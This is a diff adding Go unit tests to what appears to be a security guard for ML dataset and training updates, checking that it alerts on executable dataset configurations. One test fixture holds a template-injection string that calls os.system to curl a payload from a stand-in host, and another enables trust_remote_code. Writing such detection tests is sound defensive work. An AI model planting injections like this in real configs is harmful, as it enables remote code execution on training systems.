@@ -622,6 +622,60 @@ func TestGuard_HandleEvent_ModelDownload_TruncatedPickle(t *testing.T) {
 	}
 }
 
+func TestGuard_HandleEvent_DatasetUpdate_TemplateExecution(t *testing.T) {
+	cp := makeCapturingPipeline()
+	g := startedModuleWithPipeline(t, cp)
+	defer g.Stop()
+
+	ev := core.NewSecurityEvent("test", "dataset_update", core.SeverityInfo, "dataset update")
+	ev.Details["dataset_id"] = "hostile-dataset"
+	ev.Details["source"] = "https://huggingface.co/datasets/example/hostile"
+	ev.Details["dataset_config"] = `template: "{{ __import__('os').system('curl https://example.invalid/payload') }}"`
+
+	if err := g.HandleEvent(ev); err != nil {
+		t.Fatalf("HandleEvent() error: %v", err)
+	}
+	if !cp.hasAlertType("dataset_config_execution") {
+		t.Fatal("expected executable dataset configuration alert")
+	}
+}
+
+func TestGuard_HandleEvent_TrainingUpdate_RemoteLoader(t *testing.T) {
+	cp := makeCapturingPipeline()
+	g := startedModuleWithPipeline(t, cp)
+	defer g.Stop()
+
+	ev := core.NewSecurityEvent("test", "training_update", core.SeverityInfo, "training update")
+	ev.Details["dataset_id"] = "remote-loader-dataset"
+	ev.Details["loader_config"] = `{"trust_remote_code": true}`
+
+	if err := g.HandleEvent(ev); err != nil {
+		t.Fatalf("HandleEvent() error: %v", err)
+	}
+	if !cp.hasAlertType("dataset_config_execution") {
+		t.Fatal("expected remote dataset loader alert")
+	}
+}
+
+func TestGuard_HandleEvent_DatasetUpdate_CleanConfig(t *testing.T) {
+	cp := makeCapturingPipeline()
+	g := startedModuleWithPipeline(t, cp)
+	defer g.Stop()
+
+	ev := core.NewSecurityEvent("test", "dataset_update", core.SeverityInfo, "dataset update")
+	ev.Details["dataset_id"] = "clean-dataset"
+	ev.Details["source"] = "internal-curated"
+	ev.Details["hash"] = "sha256:trusted"
+	ev.Details["dataset_config"] = `{"format":"parquet","split":"train","streaming":false}`
+
+	if err := g.HandleEvent(ev); err != nil {
+		t.Fatalf("HandleEvent() error: %v", err)
+	}
+	if cp.hasAlertType("dataset_config_execution") {
+		t.Fatal("did not expect executable dataset configuration alert")
+	}
+}
+
 // Compile-time interface check
 var _ core.Module = (*Guard)(nil)
 
